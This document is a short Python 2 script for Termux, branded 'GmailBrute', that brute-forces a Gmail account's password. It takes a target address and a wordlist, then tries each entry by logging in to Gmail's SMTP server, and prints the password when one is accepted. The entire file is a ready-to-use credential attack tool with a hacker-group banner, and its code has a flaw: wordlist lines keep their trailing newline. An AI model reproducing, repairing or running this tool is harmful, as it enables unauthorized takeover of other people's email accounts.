#code command import 
import smtplib
import os,sys,time
#code
os.system("clear")
os.system ("termux-setup-storage")
os.system("figlet GmailBrute")
print
print"    \      oo "
print"     \____|\mm  Welcome Master"
print"     //_//\ \_\ "
print"    /V.2/   \/_/ "
print"   /___/_____\ "
print"------------------ "
print" Code - FO110W -4"
print" Group - FO110W "
print
smtpserver = smtplib.SMTP("smtp.gmail.com" , 587)
smtpserver.ehlo()
smtpserver.starttls()
print
print"[+]> Enter Gmail to Brute Force "
user = raw_input(" Email : ")
os.system("clear")
print"[+]> Enter where your Wordlist files are stored "
passF = raw_input(" Wordlist  : ")
passF = open(passF, "r")
os.system("clear")

for password in passF:


        try:

                smtpserver.login(user, password)
                print ("Password : %s" % password)
                break;

        except smtplib.SMTPAuthenticationError:
                print("\033[1;91m[+]> Not Found \033")
